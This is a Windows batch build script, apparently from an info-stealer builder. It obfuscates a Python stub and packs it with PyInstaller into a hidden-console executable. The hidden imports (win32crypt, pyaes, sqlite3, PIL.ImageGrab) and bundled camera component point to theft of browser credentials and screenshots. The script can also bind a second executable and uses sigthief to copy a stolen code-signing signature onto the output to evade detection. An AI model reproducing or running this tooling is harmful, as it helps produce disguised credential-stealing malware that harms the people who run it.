@echo off
cls
if not exist activate (
    echo venv not found
    pause
    exit
) else (
    call activate
)
cls
if not exist REQS (
    title Installing requirements...
    pip install -r requirements.txt
    type NUL > REQS
)
cls
title Obfuscating...
python process.py
title Converting to exe...
if exist bound.exe (
    set bound=--add-binary bound.exe;.
) else (
    set bound= 
)
if exist icon.ico (
    set icon=icon.ico
) else (
    set icon=NONE
)
pyinstaller --onefile --clean --noconsole --noconfirm stub-o.py --name "Built.exe" -i %icon% --hidden-import urllib3 --hidden-import sqlite3 --hidden-import PIL.Image --hidden-import PIL.ImageGrab --hidden-import PIL.ImageStat --hidden-import pyaes --hidden-import win32crypt --hidden-import json --add-data Camera;. --version-file version.txt %bound%
if exist dist\Built.exe (
    if exist cert.exe_sig (
        python sigthief.py -s cert.exe_sig -t ".\dist\Built.exe" -o ".\dist\Built_signed.exe" > NUL 2>&1
        if %errorlevel% == 0 (
            del /F .\dist\Built.exe
        )
    )
    explorer.exe dist
    exit
) else (
    echo Building failed!
    pause
    exit
)
